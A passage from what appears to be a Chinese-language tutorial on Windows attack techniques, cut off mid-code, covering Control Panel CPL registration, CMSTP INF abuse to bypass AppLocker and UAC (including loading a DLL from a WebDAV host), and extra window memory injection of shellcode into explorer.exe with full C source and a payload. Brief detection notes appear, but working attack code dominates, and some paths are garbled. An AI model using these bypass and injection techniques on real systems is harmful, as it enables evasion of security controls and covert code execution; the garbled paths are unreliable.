    DWORD dwDisposition;
    char path [] = "C:\\testcpl”;
    RegCreateKeyExA(HKEY_CURRENT_USER,
    ?              "Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
    RegSetValueExA(hKey, “testcpl.cpl”, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path))));
在控制面板被阻止打开的情况下，可以使用以下位置作为启动控制面板的替代方法。
    · C:windowssystem32control.exe
    · AppDataRoamingMicrosoftWindowsStart MenuProgramsAccessoriesSystem ToolsControl Panel.lnk
    · shell:::{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}
    · shell:::{26EE0668-A00A-44D7-9371-BEB064C98683}
    · shell:::{ED7BA470-8E54-465E-825C-99712043E01C}
    · My Control Panel.{ED7BA470-8E54-465E-825C-99712043E01C}
#### 运行效果图
当运行控制面板时，cmd.exe自动启动。
#### 检查及限制方案
监视和分析与CPL文件关联的项的活动，查找系统上未注册和潜在恶意文件。
将控制面板项的存储和执行限制在受保护目录上，例如C:\Windows
#### 参考链接
### 13、CMSTP配置文件参数利用
#### 原理及代码介绍
CMSTP.exe是用于安装Connection
Manager服务配置文件的命令行程序。程序接受INF配置文件作为参数。这项攻击手段的关键点就在于配置文件。攻击者可能会向CMSTP.exe提供受恶意命令感染的INF文件，以脚本（SCT）和DLL的形式执行任意代码。它是一个受信任的Microsoft二进制文件，位于以下两个Windows目录中：
    C:\Windows\System32\cmstp.exe
    C:\Windows\SysWOW64\cmstp.exe
AppLocker默认规则允许在这些文件夹中执行二进制文件，因此我们可以用它来作为bypass的一种方法。使用这个二进制文件可以绕过AppLocker和UAC。因为传输的并不是二进制文件，所以也会绕过一些杀软的白名单。
配置文件可以通过安装启动CMAK（Connection Manager Administration
Kit）来创建，关于CMAK可以通过[Microsoft文档](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831675\(v=ws.11\)?redirectedfrom=MSDN)进行了解。在这里就不具体演示获得INF文件的过程了，可以通过以下链接获得：[INF文件](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf)。
INF文件的内容有很多项，我们想要利用INF文件，只需要保留一些重要的项，以下是简化的INF文件内容
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    RegisterOCXs=RegisterOCXSection
    [RegisterOCXSection]
    C:\test.dll
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="Pentestlab"
    ShortSvcName="Pentestlab"
需要注意到的是INF文件的RegisterOCXSection需要包含恶意DLL文件的本地路径或远程执行的WebDAV位置。这样就能从本地或Webdav中加载DLL文件。
从WebDAV服务器实现加载dll需要修改下面内容：
    [RegisterOCXSection]
     \10.10.10.10webdavAllTheThings.dll
命令行：cmstp.exe /s c:\cmstp.inf
当然，还可以将RegisterOCXSection 换成RunPreSetupCommandsSection，在此项下可以直接执行命令程序，例如：
    [version]
    Signature=$chicago$
    AdvancedINF=2.5
    [DefaultInstall_SingleUser]
    RegisterOCXs=RegisterOCXSection
    RunPreSetupCommands=RunPreSetupCommandsSection
    [RunPreSetupCommandsSection]
    c:\windows\system32\calc.exe
    taskkill /IM cmstp.exe /F
    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="CorpVPN"
    ShortSvcName="CorpVPN"
#### 运行效果图
如下图所示，在命令行中执行cmstp 并加入相关参数cmstpdll.inf ,我们预设的dll
就运行在了cmstp进程中，此处或许可能被恶意代码所利用，用以逃避杀软白名单检测及进程检测等
执行命令，弹出计算器：
#### 检查及限制方案
  1. 使用进程监视来检测和分析CMSTP.exe的执行和参数。将最近对CMSTP.exe的调用与已知的参数和已加载文件的历史进行比较，以确定异常和潜在的对抗性活动。
  2. Sysmon事件也可以用来识别CMSTP.exe的潜在威胁。
#### 参考链接
  1. 
  2. 
  3. 
### 14、额外窗口内存注入
#### 原理及代码介绍
在创建窗口之前，基于图形Windows的进程必须注册一个Windows类，该类规定外观和行为。新窗口类的注册可以包括一个请求，请求将多达40个字节的额外窗口内存(EWM)附加到该类的每个实例的分配内存中。该EWM旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口(API)函数来设置和获取其值。
虽然EWM很小，但它的大小足以存储32位指针，并且经常用于指向Windows过程。EWMI依赖注入到资源管理器托盘窗口内存中，并在恶意软件家族Gapz和PowerLoader中使用多次。然而，在EWM中没有太多的空间。为了规避这个限制，恶意软件将代码写入explorer.exe的共享段中，并使用SetWindowLong和SendNotifyMessage得到一个指向shellcode的函数指针，然后执行它。
当写入共享段时，恶意软件有两个选项。它能创建一个共享段自己映射到另一个进程（如explorer）中，或者打开一个已存在的共享段。前者有分配堆内存的开销，而且还要调用NtMapViewOfSection等API，因此后者更常用。在恶意代码将shellcode写入共享段后，使用GetWindowLong和SetWindowLong来访问并修改Shell_TrayWnd的额外的窗口内存。GetWindowLong是用于通过32位值作为偏移得到窗口类对象中额外窗口内存，同时使用SetWindowLong能改变指定偏移的值。通过完成这个，恶意代码能改变窗口类中的函数指针，将它指向共享段的shellcode。
和上述的技术一样，恶意软件需要触发写入的代码。有一些技术是通过调用类似CreateRemoteThread，SetThreadContext，QueueUserAPC这些API来实现的。与其他不同的是，这种技术是通过使用SendNotifyMessage或PostMessage来触发代码执行的。
一旦执行SendNotifyMessage或PostMessage，Shell_TrayWnd将接收到并将控制移交给SetWindowLong设置的地址。
主程序源代码如下：
    HANDLE g_hprocess = NULL;
    unsigned char shellcode[100] = { 0, };
    DWORD shellcodeSize = sizeof(shellcode);
    PVOID mapshellocdeprocess()
    {
         HANDLE hSection = NULL;
         OBJECT_ATTRIBUTES hAttributes;
         memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));
         LARGE_INTEGER maxSize;
         maxSize.HighPart = 0;
         // 保存壳代码与指针
         maxSize.LowPart = sizeof(LONG) * 2 + shellcodeSize;
         NTSTATUS status = NULL;
         if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
         {
              printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
              return NULL;
         }
         PVOID sectionBaseAddress = NULL;
         ULONG viewSize = 0;
         SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
         // 映射
         if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
         {
              printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
              return NULL;
         }
         printf("Section BaseAddress: %p\n", sectionBaseAddress);
         // 切换到映射
         PVOID sectionBaseAddress2 = NULL;
         if ((status = NtMapViewOfSection(hSection, g_hprocess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
         {
              printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
              return NULL;
         }
         LPVOID shellcode_remote_ptr = sectionBaseAddress2;
         LPVOID shellcode_local_ptr = sectionBaseAddress;
         memcpy(shellcode_local_ptr, shellcode, shellcodeSize);
         printf("Shellcode copied!\n");
         LPVOID handles_remote_ptr = (BYTE*)shellcode_remote_ptr + shellcodeSize;
         LPVOID handles_local_ptr = (BYTE*)shellcode_local_ptr + shellcodeSize;
         PVOID buf_va = (BYTE*)handles_remote_ptr;
         LONG hop1 = (LONG)buf_va + sizeof(LONG);
         LONG shellc_va = (LONG)shellcode_remote_ptr;
         memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(LONG));
         memcpy((BYTE*)handles_local_ptr + sizeof(LONG), &shellc_va, sizeof(LONG));
         //u nmap from the context of current process
         ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
         ZwClose(hSection);
         printf("Section mapped at address: %p\n", sectionBaseAddress2);
         return shellcode_remote_ptr;
    }
    int main()
    {
         // 查找Shell_TrayWnd 外壳类，主要是管理
         HWND hWnd =
              FindWindow(
                  L"Shell_TrayWnd",
                 NULL
              );
         if (hWnd == NULL)
              return -1;
        DWORD pid = 0;
         LONG nwlong = 0;
         nwlong = GetWindowThreadProcessId(hWnd, &pid);
         // 打开Shell_TrayWnd
         g_hprocess =
              OpenProcess(
                  PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                  false,
                  pid
              );
         if (g_hprocess == NULL)
              return 0;
         // 映射shellcode
         LPVOID remoteshellcodeptr = mapshellocdeprocess();
         // 设置到额外的窗口内存中
         SetWindowLong(
             hWnd,
              0,
              /*参数三替换值shellcodeptr*/
              (LONG)remoteshellcodeptr
        );
         // 调用窗口过程也就是发送执行shellcode
         SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
        // 这里先sleep等待执行
        Sleep(5000);
         // 恢复原来得数据
         SetWindowLong(hWnd, 0, nwlong);
         SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
         CloseHandle(g_hprocess);
    }
Payload：
     LRESULT CALLBACK SubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam,
              LPARAM lParam) {
         if (uMsg != WM_CLOSE) return 0;
         WinExec_t pWinExec;
         DWORD   szWinExec[2],
              szNotepad[3];
         // WinExec
         szWinExec[0] = 0x456E6957;
         szWinExec[1] = 0x00636578;
         // runs notepad
         szNotepad[0] = *(DWORD*)"note";
         szNotepad[1] = *(DWORD*)"pad\0";
        pWinExec = (WinExec_t)puGetProcAddress(szWinExec);
         if (pWinExec != NULL) {
              pWinExec((LPSTR)szNotepad, SW_SHOW);
         }
         return 0;
    }
因为需要从OD中复制出来shellcode，放入字符串数组中运行。
所以模块基址的获取和函数的获取需要使用汇编自己获取。
    // ===================获取模块基址============================
    DWORD puGetModule(const DWORD Hash)
    {
        DWORD   nDllBase = 0;
        __asm {
            jmp         start